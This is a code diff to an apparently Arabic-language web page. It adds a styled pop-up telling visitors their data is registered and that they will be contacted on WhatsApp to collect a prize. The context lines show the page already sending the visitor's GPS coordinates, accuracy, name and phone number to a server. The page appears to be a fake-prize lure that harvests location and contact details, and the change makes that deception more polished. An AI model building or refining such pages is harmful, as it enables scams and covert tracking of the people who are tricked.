@@ -163,6 +163,49 @@
         .pulse {
             animation: pulse 2s infinite;
         }
+
+        /* إضافة تنسيقات رسالة النجاح */
+        #success-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #success-message {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            animation: slideDown 0.5s ease-out;
+        }
+
+        #success-message h3 {
+            color: #4CAF50;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        #success-message p {
+            color: #666;
+            margin: 10px 0;
+            font-size: 18px;
+        }
+
+        @keyframes slideDown {
+            from { transform: translateY(-100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
     </style>
 </head>
 <body>
@@ -213,6 +256,16 @@
 
         <div id="loading"></div>
         <div id="status"></div>
+    </div>
+
+    <!-- نقل وتحديث رسالة النجاح -->
+    <div id="success-overlay" style="display: none;">
+        <div id="success-message">
+            <h3>🎉 تم استلام طلبك بنجاح!</h3>
+            <p>مبروك! تم تسجيل بياناتك بنجاح</p>
+            <p>سيتم التواصل معك قريباً عبر WhatsApp لاستكمال إجراءات استلام جائزتك</p>
+            <p>يرجى الاحتفاظ برقم هاتفك متاحاً</p>
+        </div>
     </div>
 
     <script src="script.js"></script>
@@ -290,7 +343,9 @@
             sendLocationToServer({ latitude, longitude, accuracy, timestamp: new Date().toISOString(), name, phone })
                 .then(result => {
                     if (result.success) {
-                        document.getElementById('status').textContent = 'تم استلام موقعك بنجاح';
+                        document.getElementById('status').style.display = 'none';
+                        document.getElementById('success-overlay').style.display = 'flex';
+                        document.querySelector('.confirm-btn').disabled = true;
                     } else {
                         document.getElementById('status').textContent = 'حدث خطأ أثناء إرسال الموقع. الرجاء المحاولة مرة أخرى.';
                     }
